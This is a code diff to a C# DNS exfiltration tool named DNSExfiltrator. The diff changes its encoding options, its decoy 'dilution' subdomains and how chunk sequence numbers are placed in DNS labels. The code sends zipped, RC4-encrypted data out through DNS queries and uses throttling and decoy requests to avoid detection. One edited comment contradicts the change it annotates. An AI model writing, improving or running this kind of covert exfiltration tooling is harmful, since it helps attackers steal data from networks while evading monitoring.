@@ -34,7 +34,7 @@ namespace DNSExfiltrator
             Console.WriteLine("  t=<ms>        Throttle time in milliseconds");
             Console.WriteLine("  tr=<ms>       Random throttle (0 to ms)");
             Console.WriteLine("  l=<size>      Max label length (default: 63)");
-            Console.WriteLine("  e=<encoding>  Encoding: base32map, base32, base64, hex (default: base32map)");
+            Console.WriteLine("  e=<encoding>  Encoding: base32map, base32, hex (default: base32map)");
             Console.WriteLine("  retry=<n>     Max retry attempts (default: 3)");
             Console.WriteLine("  retrydelay=<ms>  Delay before retry (default: 1000)");
             Console.WriteLine("  dil=<count>  Number of dilution requests sent between two tunneling requests (default: 0)");
@@ -65,20 +65,7 @@ namespace DNSExfiltrator
             return Base32.ToBase32String(data).Replace("=", "");
         }
 
-        private static string ToBase64(byte[] data)
-        {
-            // DNS-safe Base64 variant:
-            // Standard Base64 uses: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
-            // DNS-safe variant: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-x
-            // Mapping: + -> -, / -> x
-            // This is reversible: - -> +, x -> /
-            string encoded = Convert.ToBase64String(data).Replace("=", "");
-            encoded = encoded.Replace("+", "-");
-            encoded = encoded.Replace("/", "x");
-            return encoded;
-        }
-
-        private static string ToHex(byte[] data)
+private static string ToHex(byte[] data)
         {
             return BitConverter.ToString(data).Replace("-", "").ToLower();
         }
@@ -102,7 +89,6 @@ namespace DNSExfiltrator
         private static string Encode(byte[] data, string encoding)
         {
             if (encoding == "base32") return ToBase32(data);
-            if (encoding == "base64") return ToBase64(data);
             if (encoding == "hex") return ToHex(data);
             return ToBase32Map(data);
         }
@@ -111,18 +97,16 @@ namespace DNSExfiltrator
         {
             if (encoding == "base32map") return 0;
             if (encoding == "base32") return 1;
-            if (encoding == "base64") return 2;
-            if (encoding == "hex") return 3;
+            if (encoding == "hex") return 2;
             return 0;
         }
 
         private static string buildDilutionDomain(Random rnd)
         {
-            char[] vowels = new char[] { 'a', 'e', 'i', 'o', 'u', 'w'};
+            char[] vowels = new char[] { 'a', 'e', 'i', 'o', 'u', 'w' };
             char baseChar = vowels[rnd.Next(vowels.Length)];
-            int length = rnd.Next(1,3);
-            string subdomain = new string(baseChar, length);
-            return subdomain;
+            int length = rnd.Next(3, 6);  // Generate 3-5 char subdomains (avoid 1-char)
+            return new string(baseChar, length);
         }
 
         private static bool VerifyAck(string reply, int expectedValue)
@@ -469,11 +453,10 @@ namespace DNSExfiltrator
                 }
 
                 int len = Math.Min(chunkSize, zipData.Length - offset);
-                byte[] chunk = new byte[len + 1]; // +1 for sequence number
-                chunk[0] = (byte)(requestsSent % 256); // Sequence number
-                Array.Copy(zipData, offset, chunk, 1, len);
+                byte[] chunk = new byte[len]; // No sequence byte - sent in label only
+                Array.Copy(zipData, offset, chunk, 0, len);
 
-                // Encrypt this chunk with seq_number (RC4 maintains state)
+                // Encrypt this chunk (no seq byte - seq is in label)
                 byte[] encryptedChunk = rc4.Encrypt(chunk, chunk.Length);
 
                 // Encode
@@ -486,8 +469,9 @@ namespace DNSExfiltrator
                     continue;
                 }
 
-                // Send as single label (no separate sequence number)
-                string request = encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
+                // Send as multi-label: seq.encodedData.domain.com
+                // Use requestsSent % 256 to match the encrypted sequence byte
+                string request = (requestsSent % 256) + "." + encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];
 
                 bool success = false;
                 RetryHelper.FailureType lastFailure = RetryHelper.FailureType.None;
